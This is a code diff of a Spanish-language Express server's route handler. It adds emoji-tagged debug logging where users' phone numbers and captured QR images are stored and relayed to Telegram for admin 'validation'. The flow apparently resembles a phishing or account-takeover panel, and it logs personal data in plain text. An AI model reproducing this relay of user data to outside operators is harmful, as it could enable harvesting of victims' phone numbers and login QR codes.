@@ -1571,25 +1571,32 @@ export async function registerRoutes(app: Express): Promise<Server> {
               case 'phone_input':
                 updatedFields.celular = inputData.phone;
                 updatedFields.pasoActual = ScreenType.QR_SCAN;
-                console.log('Teléfono recibido (QR flow):', inputData.phone);
+                console.log('🔥 TELÉFONO RECIBIDO (QR flow):', inputData.phone);
+                console.log('🔥 SessionId:', sessionId);
+                console.log('🔥 SessionFolio:', sessionFolio);
                 
                 // Enviar notificación a Telegram
                 const phoneMessage = `📱 <b>TELÉFONO RECIBIDO (Flujo QR)</b>\n\n` +
                   `📋 <b>Folio:</b> ${sessionFolio}\n` +
                   `📞 <b>Teléfono:</b> ${inputData.phone}\n` +
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                console.log('🔥 Enviando mensaje de teléfono a Telegram:', phoneMessage);
                 sendTelegramMessage(phoneMessage);
+                console.log('🔥 Mensaje de teléfono enviado');
                 break;
                 
               case 'qr_validation':
                 updatedFields.qrImage = inputData.qrImage;
                 updatedFields.qrValidated = false;
                 updatedFields.pasoActual = ScreenType.QR_VALIDATION;
-                console.log('QR recibido para validación');
+                console.log('🔥 QR RECIBIDO para validación');
+                console.log('🔥 SessionId:', sessionId);
+                console.log('🔥 SessionFolio:', sessionFolio);
                 
                 // Notificar a los administradores sobre el nuevo QR recibido
                 const sessionData = await storage.getSessionById(sessionId);
                 const qrCreatedBy = sessionData?.createdBy || '';
+                console.log('🔥 Session Data:', { celular: sessionData?.celular, createdBy: qrCreatedBy });
                 
                 // Enviar notificación a Telegram
                 const qrMessage = `📱 <b>CÓDIGO QR RECIBIDO (Flujo QR)</b>\n\n` +
@@ -1598,7 +1605,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   `📷 <b>QR:</b> Imagen capturada correctamente\n` +
                   `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
                   `⚠️ <b>Estado:</b> Esperando validación de administrador`;
+                console.log('🔥 Enviando mensaje de QR a Telegram:', qrMessage);
                 sendTelegramMessage(qrMessage);
+                console.log('🔥 Mensaje de QR enviado');
                 
                 broadcastToAdmins(JSON.stringify({
                   type: 'QR_RECEIVED',
